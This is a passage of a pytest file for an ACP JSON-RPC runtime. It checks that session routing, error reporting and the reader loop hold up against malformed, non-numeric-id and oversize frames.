        wire.tags("kirocrew-core", "kirocrew-dashboard")
        handle = await await_until(start, what="the session start")
        report = handle.mcp_session_report().payload()
        assert set(report["configured"]) == {"kirocrew-core", "kirocrew-dashboard", "external"}
        assert "external" in report["failed"]
        assert set(report["ready"]) == {"kirocrew-core", "kirocrew-dashboard"}
    finally:
        if start is not None:
            if not start.done():
                start.cancel()
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


# ── The _await_routed helper itself ──


@pytest.mark.asyncio
async def test_await_routed_tolerates_a_driver_that_has_not_run_yet():
    """The helper must not depend on the driver having been scheduled.

    This is the exact condition that made the old
    ``await asyncio.sleep(0.05); req_id = rt._next_id - 1`` idiom flake on loaded
    Windows runners: the sleep expires, but the driver task has not yet reached
    ``send_request``, so ``_next_id`` has not advanced and the computed id
    belongs to no request. The test then feeds a response nothing is waiting for
    and fails later as an opaque ``TimeoutError``.

    Here the driver is deliberately never given a chance to run before the read,
    which is the worst case of that race.
    """
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        # No yield: the driver has definitely not sent anything yet, so the old
        # arithmetic would compute an id for a request that does not exist.
        assert rt._routed_requests == {}
        stale_id = rt._next_id - 1

        routed = await _await_routed(rt, "sA")
        assert routed["sA"] != stale_id, "the old idiom would have used a wrong id"
        assert rt._routed_requests[routed["sA"]] == "sA"

        _feed(reader, {"id": routed["sA"], "result": {"stopReason": "end_turn"}})
        await await_until(driver, what="the driver finishing its turn")
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_await_routed_reports_which_sessions_were_missing_on_timeout():
    """A timeout must name the sessions it waited for, not just time out.

    The old idiom failed indirectly, in an unrelated ``wait_for``; this keeps the
    diagnosis at the line that actually waited.
    """
    rt, _, _ = _make_runtime()
    _register(rt, "sA")
    with pytest.raises(AssertionError) as exc:
        await _await_routed(rt, "sA", timeout=0.05)
    assert "sA" in str(exc.value)
    assert "currently routed" in str(exc.value)


# ── Notification routing by sessionId ──


@pytest.mark.asyncio
async def test_notification_routed_to_named_session():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    task = await _start_reader(rt)
    try:
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA", "x": 1}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        # The other session's queue must NOT have received it.
        assert q["sB"].empty()
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_notification_for_unknown_session_is_dropped_not_broadcast():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        # sessionId present but not registered → routed-by-id path misses; it
        # has a sessionId so it is NOT broadcast either.
        _feed(reader, {"method": "session/update", "params": {"sessionId": "ghost"}})
        await asyncio.sleep(0.05)
        assert q["sA"].empty()
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_null_session_notification_broadcasts_to_all():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    task = await _start_reader(rt)
    try:
        _feed(reader, {"method": "some/global", "params": {}})  # no sessionId
        a = await _next(q["sA"])
        b = await _next(q["sB"])
        assert a.method == "some/global"
        assert b.method == "some/global"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_ownerless_request_answered_once_not_broadcast():
    """A server→client REQUEST with no sessionId gets exactly ONE -32601 reply.

    The runtime answers it once at connection level and never enqueues it. The
    broadcast branch is wrong here: every registered session's dispatch loop
    would classify it as server_request_unknown and each reply -32601 on the
    shared stdin — one request id, N responses.
    """
    rt, reader, proc = _make_runtime()
    q = _register(rt, "sA", "sB")
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": 4864, "method": "unknown/ownerless", "params": {}})
        # The answer task runs off the reader loop; give it ticks to complete.
        for _ in range(20):
            await asyncio.sleep(0)
        replies = [json.loads(call.args[0].decode()) for call in proc.stdin.write.call_args_list]
        errors = [r for r in replies if r.get("id") == 4864 and "error" in r]
        assert len(errors) == 1, f"expected exactly one reply, got {replies}"
        assert errors[0]["error"]["code"] == -32601
        # Not enqueued to ANY session — no dispatch loop ever sees it.
        assert q["sA"].empty()
        assert q["sB"].empty()
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_permission_answer_waits_for_shared_answer_capacity_then_answers():
    """A temporary full cap delays, rather than drops, the next auto-answer.

    Drives the unroutable-permission answerer, the one caller of the shared
    admission wait. (It was written against KAS's credential callback, which was
    the second caller until kiro-cli's ACP relay took ownership of auth.)
    """
    rt, _reader, _ = _make_runtime()
    rt._max_answer_tasks = 1
    first_started = asyncio.Event()
    second_started = asyncio.Event()
    second_capacity_check = asyncio.Event()
    release_first = asyncio.Event()
    release_second = asyncio.Event()
    capacity_checks = 0

    async def blocked_answer(msg, session_id, *, reason="x") -> None:
        del session_id, reason
        if msg.id == 1:
            first_started.set()
            await release_first.wait()
        else:
            second_started.set()
            await release_second.wait()

    wait_for_capacity = rt._wait_for_answer_capacity

    async def observed_capacity(*args, **kwargs) -> bool:
        nonlocal capacity_checks
        capacity_checks += 1
        if capacity_checks == 2:
            second_capacity_check.set()
        return await wait_for_capacity(*args, **kwargs)

    rt._answer_unroutable_permission = blocked_answer  # type: ignore[method-assign]
    rt._wait_for_answer_capacity = observed_capacity  # type: ignore[method-assign]
    try:
        await rt._spawn_answer_task(_permission_msg(1), "sA")
        await await_until(first_started, what="the first answer task starting")
        assert len(rt._answer_tasks) == 1

        second = asyncio.ensure_future(rt._spawn_answer_task(_permission_msg(2), "sA"))
        await await_until(second_capacity_check, what="the second answer task's capacity check")
        assert not second_started.is_set()

        release_first.set()
        await await_until(second_started, what="the second answer task starting")
        await second
        assert len(rt._answer_tasks) == 1
        assert sum(rt._dropped_frames.values()) == 0

        retained = next(iter(rt._answer_tasks))
        discarded = asyncio.Event()
        retained.add_done_callback(lambda _task: discarded.set())
        release_second.set()
        await await_until(discarded, what="the retained answer task being discarded")
        assert rt._answer_tasks == set()
    finally:
        release_first.set()
        release_second.set()
        await asyncio.gather(*rt._answer_tasks, return_exceptions=True)


@pytest.mark.asyncio
async def test_ownerless_response_with_null_result_is_not_answered():
    """An id-carrying frame with NO method is a response, not a request.

    A response whose result is null slips past the result/error routing check;
    it must not be mistaken for an ownerless request and answered -32601 —
    that would inject a spurious error reply for an id the backend owns.
    """
    rt, reader, proc = _make_runtime()
    _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": 77, "result": None})  # response shape, no method
        for _ in range(20):
            await asyncio.sleep(0)
        replies = [json.loads(call.args[0].decode()) for call in proc.stdin.write.call_args_list]
        assert not [r for r in replies if r.get("id") == 77]
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_answer_cap_timeout_marks_runtime_dead_without_growth():
    """A wedged shared cap fails the runtime instead of losing a request."""
    rt, _reader, _ = _make_runtime()
    rt._max_answer_tasks = 1
    rt._answer_cap_wait_secs = 0.0
    first_started = asyncio.Event()
    release_first = asyncio.Event()
    second_started = asyncio.Event()
    marked_dead = asyncio.Event()
    dead_reasons: list[str] = []

    async def blocked_answer(msg, session_id, *, reason="x") -> None:
        del session_id, reason
        if msg.id == 1:
            first_started.set()
            await release_first.wait()
        else:
            second_started.set()

    def mark_dead(reason: str, **_kw: object) -> None:
        dead_reasons.append(reason)
        rt._dead = True
        marked_dead.set()

    rt._answer_unroutable_permission = blocked_answer  # type: ignore[method-assign]
    rt._mark_dead = mark_dead  # type: ignore[method-assign]
    try:
        await rt._spawn_answer_task(_permission_msg(1), "sA")
        await await_until(first_started, what="the first answer task starting")

        await rt._spawn_answer_task(_permission_msg(2), "sA")
        await await_until(marked_dead, what="the runtime being marked dead")

        assert not second_started.is_set()
        assert len(rt._answer_tasks) == 1
        assert sum(rt._dropped_frames.values()) == 0
        assert dead_reasons and "permission" in dead_reasons[0]
    finally:
        release_first.set()
        await asyncio.gather(*rt._answer_tasks, return_exceptions=True)


# ── Response routing by id ──


@pytest.mark.asyncio
async def test_awaited_response_resolves_pending_future():
    rt, reader, _ = _make_runtime()
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[7] = fut
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": 7, "result": {"sessionId": "new1"}})
        result = await await_until(fut, what="the pending request's future")
        assert result == {"sessionId": "new1"}
        assert 7 not in rt._pending_requests
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_missing_agent_spec_error_reaches_caller_actionable(tmp_path):
    """A missing agent spec must not reach the caller as a raw -32603 dict.

    kiro-cli answers ``session/set_mode`` for an agent it cannot resolve with a
    bare "Internal error" whose data is ``Mode '<name>' not found``. Routed raw,
    the caller — and the dashboard chat bubble behind it — got the JSON-RPC dict
    verbatim: an internal ACP concept, no mention of the missing file, and no
    remedy, on a condition that fails every subsequent turn too.

    This pins the formatting AT THE CALL SITE rather than only unit-testing the
    helper: the awaited-request branch of the reader is the single path every
    handshake error (initialize / session/new / session/set_mode) takes, so a
    regression that unwires the helper is invisible to a helper-only test.
    """
    rt, reader, _ = _make_runtime()
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[7] = fut
    task = await _start_reader(rt)
    try:
        with patch("kiro_crew.acp.runtime.kiro_agents_dir", return_value=tmp_path):
            _feed(
                reader,
                {
                    "id": 7,
                    "error": {
                        "code": -32603,
                        "message": "Internal error",
                        "data": "Mode 'kirocrew' not found",
                    },
                },
            )
            with pytest.raises(AcpRuntimeError) as excinfo:
                await await_until(fut, what="the pending request's future")
    finally:
        await _stop_reader(task)

    text = str(excinfo.value)
    assert "'kirocrew.json'" in text  # the file that is missing
    assert str(tmp_path) in text  # where it was looked for
    assert "kirocrew setup --agent-only`" in text  # the repair
    assert "--clean" not in text  # which would drop the operator's own config
    assert "-32603" not in text  # no raw protocol frame


@pytest.mark.asyncio
async def test_non_numeric_response_id_dropped_without_killing_demux():
    """The id in a response frame is agent-controlled. int("req-1") raised
    ValueError, which the reader's catch-all turned into _mark_dead — poisoning
    EVERY multiplexed session over one unmatched frame. The frame must be
    dropped and the reader must keep routing."""
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[7] = fut
    task = await _start_reader(rt)
    try:
        # String / list / overflow ids: none int() coercible. json parses
        # 1e9999 to float("inf"), which raises OverflowError (not ValueError).
        _feed(reader, {"id": "req-1", "result": {"ok": True}})
        _feed(reader, {"id": [1], "error": {"code": -1}})
        reader.feed_data(b'{"id": 1e9999, "result": {}}\n')
        # The reader must still be alive: a valid response and a routed
        # notification must both be delivered after the bad frames.
        _feed(reader, {"id": 7, "result": {"sessionId": "new1"}})
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        result = await await_until(fut, what="the pending request's future")
        assert result == {"sessionId": "new1"}
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_numeric_string_response_id_still_coerced():
    """A digit-string id ("7") keeps working — it was int()-coerced before and
    must keep matching the pending int key after the guard."""
    rt, reader, _ = _make_runtime()
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[7] = fut
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": "7", "result": {"ok": 1}})
        result = await await_until(fut, what="the pending request's future")
        assert result == {"ok": 1}
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_error_response_sets_exception_on_future():
    rt, reader, _ = _make_runtime()
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[9] = fut
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": 9, "error": {"code": -1, "message": "boom"}})
        with pytest.raises(AcpRuntimeError):
            await await_until(fut, what="the pending request's future")
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_routed_response_goes_to_session_queue():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    rt._routed_requests[11] = "sA"
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": 11, "result": {"stopReason": "end_turn"}})
        msg = await _next(q["sA"])
        assert msg.id == 11
        assert 11 not in rt._routed_requests
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_unmatched_response_is_ignored():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        _feed(reader, {"id": 999, "result": {}})  # no pending/routed entry
        await asyncio.sleep(0.05)
        assert q["sA"].empty()
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_non_json_line_is_skipped():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        reader.feed_data(b"not json at all\n")
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"  # loop survived the bad line
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_non_object_json_line_does_not_crash_reader():
    """A valid-JSON but non-object line (bare scalar / array) must be skipped,
    not fed to JsonRpcMessage.from_dict (which would raise AttributeError and
    tear down EVERY multiplexed session on the shared runtime)."""
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        for bad in (b"123\n", b'"a string"\n', b"[1, 2, 3]\n", b"true\n", b"null\n"):
            reader.feed_data(bad)
        # A well-formed frame after the bad lines must still route → reader alive.
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        assert not rt._dead  # reader never marked the runtime dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad",
    [
        # About 60 KB: under the reader's 64 KiB buffer, so the line reaches the
        # parser instead of being dropped as oversize.
        pytest.param(b"[" * 30_000 + b"]" * 30_000 + b"\n", id="nested-past-decoder-ceiling"),
        pytest.param(b"1" * 5_000 + b"\n", id="integer-past-digit-limit"),
        pytest.param(b"\x80 stray bytes\n", id="invalid-utf8"),
        pytest.param(b"\xff\xfe stray bytes\n", id="utf16-bom"),
    ],
)
async def test_line_json_loads_rejects_without_decode_error_does_not_crash_reader(bad):
    """A line that ``json.loads`` rejects with something other than
    ``json.JSONDecodeError`` is skipped like a non-JSON line.

    Nesting past the decoder's ceiling raises ``RecursionError``, an integer
    past the int-string digit limit a plain ``ValueError``, and undecodable
    bytes ``UnicodeDecodeError``. None of them may reach the loop's crash arm,
    which marks the runtime dead and ends every multiplexed session on it.
    """
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        reader.feed_data(bad)
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert not rt._dead, "one stray stdout line marked the shared runtime dead"
        assert msg.params["sessionId"] == "sA"
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_frame_with_an_invalid_utf8_byte_in_a_string_is_still_routed():
    """An invalid byte inside a string value costs that character, not the frame:
    the reader decodes with replacement, as ``AcpClient._read_message`` does."""
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        reader.feed_data(
            b'{"method":"session/update","params":{"sessionId":"sA","note":"a\xffb"}}\n'
        )
        msg = await _next(q["sA"])
        assert not rt._dead, "one invalid byte marked the shared runtime dead"
        assert msg.params == {"sessionId": "sA", "note": "a\ufffdb"}
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_oversize_stdout_frame_is_dropped_not_fatal():
    """A single JSON-RPC line over the stdout buffer must cost ONE frame, not
    the whole runtime.

    Marking the runtime dead on overrun would poison every multiplexed
    session's queue and fail every pending future, surfacing as
    "process exited / chat failure" mid-turn after one huge tool result.

    Driven through a REAL StreamReader so this asserts asyncio's actual
    behaviour, not a mock's.
    """
    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        reader.feed_data(b"X" * 1024 + b"\n")  # oversize, newline present
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_an_oversize_reply_fails_its_awaited_request_with_the_size_and_limit():
    """A session/new reply over the frame limit (every agent's welcomeMessage,
    say) must fail that request at once naming the frame size and the limit --
    not surface minutes later as a session/new timeout blamed on MCP servers.
    The reader keeps routing afterwards."""
    from kiro_crew.acp.session_handle import AcpFrameTooLarge

    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    q = _register(rt, "sA")
    future: asyncio.Future = asyncio.get_running_loop().create_future()
    rt._pending_requests[7] = future
    task = await _start_reader(rt)
    try:
        frame = b'{"jsonrpc":"2.0","id":7,"result":{"modes":"' + b"W" * 2048 + b'"}}\n'
        reader.feed_data(frame)
        with pytest.raises(AcpFrameTooLarge) as excinfo:
            await await_until(future, what="the pending request's future")
        message = str(excinfo.value)
        assert f"{len(frame):,} bytes" in message
        assert f"{runtime_mod._STDOUT_BUFFER_LIMIT:,}-byte" in message
        assert not getattr(excinfo.value, "transient", False)
        assert "MCP" not in message
        assert 7 not in rt._pending_requests
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_an_oversize_host_request_never_fails_one_of_ours():
    """The host numbers its own requests (a permission prompt) independently, so
    an oversize frame carrying ``method`` must not fail our request with that id."""
    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    future: asyncio.Future = asyncio.get_running_loop().create_future()
    rt._pending_requests[3] = future
    task = await _start_reader(rt)
    try:
        reader.feed_data(
            b'{"jsonrpc":"2.0","id":3,"method":"session/request_permission","params":"'
            + b"P" * 2048
            + b'"}\n'
        )
        await asyncio.sleep(0.2)
        assert not future.done()
        assert 3 in rt._pending_requests
    finally:
        future.cancel()
        await _stop_reader(task)


@pytest.mark.asyncio
@pytest.mark.parametrize("path", ["create", "load"])
async def test_an_oversize_session_start_reply_is_a_tagged_start_failure(monkeypatch, path):
    """A self-driving caller counts start failures by ``session_start_failed`` to back
    off; an oversize session/new or session/load reply is one, and it is not
    transient -- the same request gets the same reply."""
    from kiro_crew.acp.session_handle import AcpFrameTooLarge

    rt, _, _ = _make_runtime()
    rt._can_load_session = True

    async def _oversize(method, params, timeout=None):
        if method in (METHOD_SESSION_NEW, METHOD_SESSION_LOAD):
            raise AcpFrameTooLarge(runtime_mod._oversize_frame_message(11_000_000))
        return {}

    monkeypatch.setattr(rt, "_send_and_await", _oversize)
    with pytest.raises(AcpFrameTooLarge) as excinfo:
        if path == "create":
            await rt.create_session(cwd="/work", agent="kirocrew")
        else:
            await rt.load_session(
                "/home/u/.kiro/sessions/cli/sid-1.json", "sid-1", cwd="/work", agent="kirocrew"
            )
    assert excinfo.value.session_start_failed is True
    assert excinfo.value.transient is False
    from kiro_crew.llm_helpers import acp_error_is_transient

    assert acp_error_is_transient(excinfo.value) is False


@pytest.mark.asyncio
async def test_an_oversize_session_new_reply_releases_its_start_permit(monkeypatch):
    """The start gate admits a few session starts at once and has no reaper, so a
    start that fails on an oversize reply must give its slot back -- otherwise two
    such failures block every later ``create_session`` on the loop."""
    from kiro_crew.acp import runtime_start
    from kiro_crew.acp.session_handle import AcpFrameTooLarge

    released: list[str] = []
    recorded: list[bool] = []
    real_acquire = runtime_mod.SessionStartGate.acquire

    async def acquire(self, *a, **k):
        permit = await real_acquire(self, *a, **k)
        original = permit.release

        def release():
            released.append("x")
            return original()

        permit.release = release
        return permit

    monkeypatch.setattr(runtime_mod.SessionStartGate, "acquire", acquire)
    monkeypatch.setattr(
        runtime_start, "_record_session_start", lambda *_a, ok, **_k: recorded.append(ok)
    )
    rt, _, _ = _make_runtime()

    async def _oversize(method, params, timeout=None):
        if method == METHOD_SESSION_NEW:
            raise AcpFrameTooLarge(runtime_mod._oversize_frame_message(11_000_000))
        return {}

    monkeypatch.setattr(rt, "_send_and_await", _oversize)
    with pytest.raises(AcpFrameTooLarge):
        await rt.create_session(cwd="/work", agent="kirocrew")
    assert released == ["x"]
    assert recorded == [False]


def test_the_oversize_frame_id_is_read_only_from_a_reply_envelope():
    rid = runtime_mod._oversize_frame_request_id
    assert rid(b'{"jsonrpc":"2.0","id":12,"result":{') == 12
    assert rid(b'{"jsonrpc":"2.0","result":{"availableModes":[{"id":"kiro_default"}') is None
    assert rid(b'{"jsonrpc":"2.0","id":4,"method":"session/request_permission"') is None
    assert rid(b"XXXX") is None
    assert rid(b'{"jsonrpc":"2.0","result":{"x":{"id":5,"y":1}}') is None


@pytest.mark.asyncio
async def test_unterminated_oversize_stdout_recovers_at_next_frame():
    """The shape actually observed in the field: an oversize line whose newline
    has NOT arrived yet, so the reader drains prefix after prefix before the
    stream is back in sync. It must ride through every step and route the next
    real frame.

    Asserts the outcome (recovery), not the step count: how many buffer-fulls
    the reader sees depends on how the feeds interleave with its task.
    """
    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        for _ in range(4):
            reader.feed_data(b"Y" * 512)  # no newline anywhere
            await asyncio.sleep(0)
        reader.feed_data(b"TAIL-OF-OVERSIZE-LINE\n")  # line finally terminates
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_oversize_frame_split_mid_multibyte_does_not_kill_demux():
    """The drained remainder must never reach json.loads.

    The drain must not consume only the buffered prefix and let the recovered
    tail through as a line, because that tail is
    a byte-slice cut at an arbitrary offset, so an oversize frame carrying
    multibyte UTF-8 (CJK, emoji — ordinary in tool output) splits a character;
    `json.loads` then raises UnicodeDecodeError, which is NOT a
    json.JSONDecodeError, so it escaped the non-JSON guard into the loop's crash
    handler and killed EVERY multiplexed session.
    """
    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        # Two conditions make the tail reach the parser, and both are ordinary:
        #  - the discard boundary must fall mid-character, which the UNTERMINATED
        #    branch does by construction (it reports `consumed = len(buffer)`, an
        #    arbitrary byte offset; a newline-terminated overrun instead reports
        #    the newline's offset, already a character boundary), and
        #  - the remainder after the last discard must be UNDER the reader limit,
        #    so readuntil returns it as a normal-looking line instead of
        #    overrunning again.
        # Dense CJK, fed in 500-byte slices that are not multiples of 3.
        blob = ("苹" * 400).encode() + b"\n"  # 1201 bytes
        assert len(blob) % 3 != 0
        for off in range(0, 1000, 500):
            reader.feed_data(blob[off : off + 500])
            await asyncio.sleep(0)
        reader.feed_data(blob[1000:])  # 201 bytes < limit → returned as a line
        _feed(reader, {"method": "session/update", "params": {"sessionId": "sA"}})
        msg = await _next(q["sA"])
        assert msg.params["sessionId"] == "sA"
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_many_terminated_oversize_frames_never_exhaust_the_budget():
    """A run of oversize-but-properly-terminated frames must stay survivable.

    The guard counts bytes-without-a-boundary, not oversize *frames*: counting
    frames would let a replay of N newline-terminated >limit frames walk
    straight into runtime death even though every one recovers a frame
    boundary. The budget is scoped to a single drain call, each of which
    provably ends on a boundary.
    """
    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    q = _register(rt, "sA")
    task = await _start_reader(rt)
    rounds = 40
    try:
        for i in range(rounds):
            reader.feed_data(b"X" * 4096 + b"\n")
            _feed(reader, {"method": "session/update", "params": {"sessionId": "sA", "n": i}})
        for i in range(rounds):
            msg = await _next(q["sA"])
            assert msg.params["n"] == i
        assert not rt._dead
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_unterminated_blob_past_the_byte_budget_marks_runtime_dead():
    """The escape hatch: a stream that never yields a frame boundary would have
    the reader draining forever, so exceeding the byte budget must still reach the
    terminal state.

    The liveness oracle cannot cover this case — it reads CPU/IO movement, and a
    garbage-spewing stream moves both, so it would be judged WORKING.
    """
    rt, _, proc = _make_runtime()
    reader = asyncio.StreamReader(limit=256)
    proc.stdout = reader
    _register(rt, "sA")
    task = await _start_reader(rt)
    try:
        fed = 0
        while fed <= _OVERSIZE_DRAIN_MAX_BYTES and not rt._dead:
            reader.feed_data(b"Z" * 65536)  # never a newline
            fed += 65536
            await asyncio.sleep(0)
        await await_until(task, what="the reader loop exiting")
    except Exception:
        pass
    finally:
        await _stop_reader(task)
    assert rt._dead


def test_runtime_reuses_clients_oversize_drain_helper():
    """The consume-prefix-and-retry drain must have ONE definition. A second copy
    is how two read paths drift apart (they already disagreed once, when only one
    of them killed the process)."""
    import kiro_crew.acp.client as client_mod
    import kiro_crew.acp.runtime as runtime_mod

    assert runtime_mod._drain_oversize_line is client_mod._drain_oversize_line
    assert runtime_mod.OversizeLineUnrecoverable is client_mod.OversizeLineUnrecoverable


def test_runtime_uses_clients_augmented_kiro_bin_resolver():
    """Every spawn path must resolve kiro-cli via the SAME augmented-PATH resolver
    as AcpClient (honours KIROCREW_KIRO_BIN + augmented_path so a non-login
    gateway finds a ~/.local/bin install). A bare shutil.which(PATH) duplicate
    regressed the kiro/_bg path to 'kiro-cli not found in PATH'. Assert
    single-source.

    Read as SOURCE rather than by identity because each kiro-family harness
    resolves the binary at call time, which is what lets a test patch the
    resolver at its definition site instead of at a re-export that may not
    exist."""
    import inspect

    import kiro_crew.acp.client as client_mod
    from kiro_crew.acp.harness import KasHarness, KiroHarness

    assert hasattr(client_mod, "_resolve_kiro_bin_for_spawn")
    for harness in (KiroHarness, KasHarness):
        source = inspect.getsource(harness.resolve_spawn)
        assert "_resolve_kiro_bin_for_spawn" in source, harness.__name__
        assert "shutil.which" not in source, harness.__name__


@pytest.mark.parametrize("backend", [None, ACP_BACKEND_KAS])
@pytest.mark.asyncio
async def test_runtime_missing_kiro_bin_reports_the_directories_it_searched(backend):
    """The runtime spawn path must DIAGNOSE a missing Kiro CLI, not just name it.

    ``AcpClient._spawn`` already separates "this binary is not installed" from
    "its install directory is outside the search" by naming every directory it
    walked (see ``test_spawn_kiro_missing_bin_reports_only_resolver_search_dirs``
    and ``env.describe_search_path``). The runtime sibling raised a bare
    ``kiro-cli not found in PATH``, which is both less information and factually
    wrong: resolution also walks ``%LOCALAPPDATA%\\Kiro-Cli``,
    ``%ProgramFiles%\\Kiro-Cli`` and the ``KIROCREW_KIRO_BIN`` override, none of
    which is PATH.

    That gap misleads. A "not found in PATH" message invites running
    ``where kiro-cli``, getting nothing, seeing the gateway's OWN ``kirocrew.exe``
    in the app bundle, and concluding the agent CLI is renamed and this
    lookup is stale. It is not: ``kirocrew`` is Kiro Crew's own console
    script and ``kiro-cli`` is a separate prerequisite the message never said it
    was looking for anywhere but PATH.

    Both spawn branches are covered because both resolve the same binary and both
    have to answer the same question.
    """
    import kiro_crew.acp.client as client_mod

    searched = [os.path.join(os.sep, "managed-bin"), os.path.join(os.sep, "path-bin")]
    unsearched = os.path.join(os.sep, "never-checked")
    rt = AcpRuntime(work_dir="/tmp")
    if backend is not None:
        rt._acp_backend = backend

    async def _no_bin(*, environ=None, home=None):
        return None

    with (
        patch.object(client_mod, "_resolve_kiro_bin_for_spawn", _no_bin),
        patch.object(client_mod, "known_kiro_cli_dirs", return_value=searched),
    ):
        with pytest.raises(AcpRuntimeError) as raised:
            await rt._resolve_spawn_plan()

    message = str(raised.value)
    assert "searched 2 directories" in message
    assert searched[0] in message
    assert searched[1] in message
    assert unsearched not in message
    # The remedy travels with the diagnosis, the rule env.MCP_PATH_HINT exists
    # for: a reader who learns the search missed their install needs the one
    # knob that covers it named here, not only in the source.
    assert "KIROCREW_KIRO_BIN" in message


async def _wait_for_queued(admission: _ColdStartAdmission, expected: int) -> None:
    """Yield to scheduled starters until the coordinator exposes the queue."""
    for _ in range(100):
        if admission.queued == expected:
            return
        await asyncio.sleep(0)
    raise AssertionError(
        f"cold-start queue did not reach {expected}, active={admission.active}, "
        f"queued={admission.queued}"
    )


@pytest.mark.asyncio
async def test_cold_start_admission_caps_simultaneous_runtime_spawns(monkeypatch):
    import kiro_crew.acp.runtime as runtime_mod

    admission = _ColdStartAdmission(limit=2)
    monkeypatch.setattr(runtime_mod, "_cold_start_admission", lambda: admission)
    release = asyncio.Event()
    first_two_entered = asyncio.Event()
    running = 0
    peak = 0

    async def controlled_spawn(self):
        nonlocal peak, running
        running += 1
        peak = max(peak, running)
        if running == 2:
            first_two_entered.set()
        try:
            await release.wait()
        finally:
            running -= 1

    monkeypatch.setattr(AcpRuntime, "_spawn_admitted", controlled_spawn)
    tasks = [asyncio.create_task(AcpRuntime().spawn()) for _ in range(3)]
    try:
        await await_until(first_two_entered, what="the first two spawns entering")
        await _wait_for_queued(admission, 1)

        assert peak == 2
        assert admission.active == 2
        assert admission.queued == 1
    finally:
        release.set()
        await asyncio.gather(*tasks, return_exceptions=True)

    assert peak == 2
    assert admission.active == 0
    assert admission.queued == 0


@pytest.mark.asyncio
async def test_cold_start_cancellation_releases_active_admission_slot(monkeypatch):
